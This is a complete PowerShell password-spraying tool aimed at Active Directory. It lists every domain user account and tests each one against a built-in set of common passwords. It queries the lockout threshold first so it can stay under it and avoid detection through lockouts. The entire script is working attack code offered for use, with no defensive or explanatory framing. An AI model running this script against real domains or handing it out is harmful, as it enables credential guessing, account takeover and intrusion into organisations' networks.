<#
.Synopsis
    Brute-forces active directory user accounts based on the password lockout threshold
.DESCRIPTION
	Brute-forces active directory user accounts based on the password lockout threshold
.EXAMPLE
    PS C:\> Brute-Ad
    Generate a PSObject of results.
.EXAMPLE
	Brute-Ad | Where {$_.IsValid -eq $True}
	Generate a PSObject of results where the password attempt is successful 
.EXAMPLE
	Brute-Ad -Password 'OnePasswordAttempt'
	Brute-forces active directory user accounts based on the password lockout threshold but stops on a sucessful attempt
#>
function Brute-Ad ($Password)
{
    if ($Password) {
        $allpasswords = @("$Password")
    } else {
        $allpasswords = @('Password1','password','Password2015','Pa55w0rd','password123','Pa55w0rd1234')
    }

	Function Get-LockOutThreshold  
	{
		$domain = [ADSI]"WinNT://$env:userdomain"
		$Name = @{Name='DomainName';Expression={$_.Name}}
		$AcctLockoutThreshold = @{Name='Account Lockout Threshold (Invalid logon attempts)';Expression={$_.MaxBadPasswordsAllowed}}
		$domain | Select-Object $AcctLockoutThreshold
	}

	$lockout = Get-LockOutThreshold

	Function Test-ADCredential
	{
		Param($username, $password, $domain)
		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
		$ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
		$pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct, $domain)
		$object = New-Object PSObject | Select Username, Password, IsValid
		$object.Username = $username;
		$object.Password = $password;
		$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
		return $object
	}

	$domain = $env:USERDOMAIN
	$username = ''

	$lockoutthres =  $lockout.'Account Lockout Threshold (Invalid logon attempts)'

	if (!$lockoutthres)
	{
	    $passwords = $allpasswords #no lockout threshold
	}
	elseif ($lockoutthres -eq 1)
	{
	    $passwords = $allpasswords | Select-Object -First 1
	}
	else
	{
	    $passwords = $allpasswords | Select-Object -First ($lockoutthres -=1)
	}

	$DirSearcher = New-Object System.DirectoryServices.DirectorySearcher([adsi]'')
    $DirSearcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
	$DirSearcher.FindAll().GetEnumerator() | ForEach-Object{ 

	    $username = $_.Properties.samaccountname
	    foreach ($password in $passwords) 
	    {
	    	$result = Test-ADCredential $username $password 
	    	$result
	    }
	}
}
